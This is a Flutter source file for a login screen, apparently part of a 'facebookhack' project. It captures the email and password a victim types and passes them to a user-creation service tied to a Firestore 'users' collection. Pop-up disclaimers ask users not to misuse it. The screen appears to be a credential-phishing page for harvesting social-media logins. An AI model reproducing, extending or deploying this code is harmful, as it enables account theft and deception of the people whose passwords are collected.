import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:facebookhack/screen/home.dart';
import 'package:flutter/material.dart';
import 'package:flutter/scheduler.dart';
import 'package:rflutter_alert/rflutter_alert.dart';

import '../services/loginservices.dart';

class LoginScreen extends StatefulWidget {
  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  @override
  void initState() {
    super.initState();

    SchedulerBinding.instance?.addPostFrameCallback((_) {
      AlertDialogMsg(context);
    });
  }

  // const LoginScreen({
  @override
  Widget build(BuildContext context) {
    double screenHeight = MediaQuery.of(context).size.height;
    return Scaffold(
      backgroundColor: Colors.white,
      body: SafeArea(
        child: ListView(
          children: [
            Container(
              height: screenHeight,
              child: Padding(
                padding: EdgeInsets.only(left: 30, right: 30),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    HeaderSection(),
                    SizedBox(height: 20),
                    WidgetsContainer(),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class HeaderSection extends StatelessWidget {
  const HeaderSection({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Column(
      children: [
        Image.asset('assets/images/cover.jpg'),
        SizedBox(
          height: 30,
        ),
        const Text(
          'Sign in to Continue..',
          style: TextStyle(fontSize: 30, fontWeight: FontWeight.w600),
        ),
        SizedBox(height: 15),
        Text('Warning !',
            style: TextStyle(fontSize: 20, color: Colors.red[900])),
        Text(
          'make sure this is not for personal attack',
          style: TextStyle(fontSize: 15, color: Colors.grey),
        ),
      ],
    );
  }
}

class WidgetsContainer extends StatefulWidget {
  // const WidgetsContainer({Key? key}) : super(key: key);

  @override
  State<WidgetsContainer> createState() => _WidgetsContainerState();
}

class _WidgetsContainerState extends State<WidgetsContainer> {
  CollectionReference users = FirebaseFirestore.instance.collection('users');
  final GlobalKey<FormState> formKey = GlobalKey<FormState>();
  bool icon = true;
  bool loading = false;
  bool _passwordVisible = true;
  bool _suffixIconBool = true;

  String? errorMessage;
  TextEditingController _email = TextEditingController();
  TextEditingController _password = TextEditingController();

  void toggle() {
    setState(() {
      _passwordVisible = !_passwordVisible;
      _suffixIconBool = !_suffixIconBool;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      child: Form(
        key: formKey,
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            AuthenticationTextField(
              hint: "Enter Your Email",
              prefixIcon: Icons.email,
              controller: _email,
              labeltxt: 'Please Enter Your Email',
            ),
            SizedBox(height: 30),
            AuthenticationTextField(
              hint: "Enter Your Password",
              prefixIcon: Icons.lock,
              controller: _password,
              labeltxt: 'Please Enter Password',
              suffixIcon:
                  _suffixIconBool ? Icons.visibility_off : Icons.visibility,
              iconPressed: toggle,
              passwordVisible: _passwordVisible,
            ),
            SizedBox(height: 40),
            loading
                ? Center(child: CircularProgressIndicator())
                : Center(
                    child: MaterialButton(
                      onPressed: () async {
                        if (formKey.currentState!.validate()) {
                          await ProfileService().createUser(
                            password: _password.text,
                            email: _email.text,
                          );

                          Navigator.pushReplacement(
                            context,
                            MaterialPageRoute(
                              builder: (context) => HomeScreen(),
                            ),
                          );
                        }
                      },
                      color: Color(0xFF083663),
                      height: 50,
                      minWidth: 320,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: Text(
                        'Login',
                        style: TextStyle(
                            color: Colors.white,
                            fontSize: 20,
                            fontWeight: FontWeight.bold),
                      ),
                    ),
                  ),
          ],
        ),
      ),
    );
  }
}

class AuthenticationTextField extends StatelessWidget {
  AuthenticationTextField(
      {Key? key,
      this.keyboardType = TextInputType.text,
      required this.hint,
      required this.controller,
      required this.prefixIcon,
      this.suffixIcon,
      this.iconPressed,
      this.passwordVisible = false,
      required this.labeltxt});
  final String hint;
  final String labeltxt;
  final TextInputType keyboardType;

  final TextEditingController controller;
  final IconData prefixIcon;
  final IconData? suffixIcon;
  final Function()? iconPressed;
  final bool passwordVisible;

  @override
  Widget build(BuildContext context) {
    return TextFormField(
      obscureText: passwordVisible,
      keyboardType: keyboardType,
      controller: controller,
      style:
          TextStyle(fontWeight: FontWeight.w600, color: Colors.grey.shade700),
      validator: (String? value) {
        if (value == null) {
          return 'Failure';
        }
        if (value.isEmpty) {
          return '*required';
        }
        return null;
      },
      decoration: InputDecoration(
          label: Text(labeltxt),
          prefixIcon: Icon(prefixIcon),
          suffixIcon:
              IconButton(icon: Icon(suffixIcon), onPressed: iconPressed),
          hintText: hint,
          focusedErrorBorder: OutlineInputBorder(
            borderSide: BorderSide(color: Colors.red),
          ),
          errorBorder: OutlineInputBorder(
            borderSide: BorderSide(color: Colors.red),
          ),
          focusedBorder: OutlineInputBorder(
            borderSide: BorderSide(color: Color(0xFF083663), width: 2),
          ),
          enabledBorder: OutlineInputBorder(
            borderSide: BorderSide(color: Color(0xFF083663)),
          )),
    );
  }
}

AlertDialogMsg(context) {
  Alert(
    context: context,
    title: "アラート !",
    desc: "Caution ! Please do not use it for wrong way..",
    style: AlertStyle(
        descStyle: TextStyle(color: Colors.red[900]),
        titleStyle: TextStyle(
            color: Colors.red[900], fontWeight: FontWeight.bold, fontSize: 20)),
    image: Image.asset("assets/images/warning.png"),
  ).show();
}
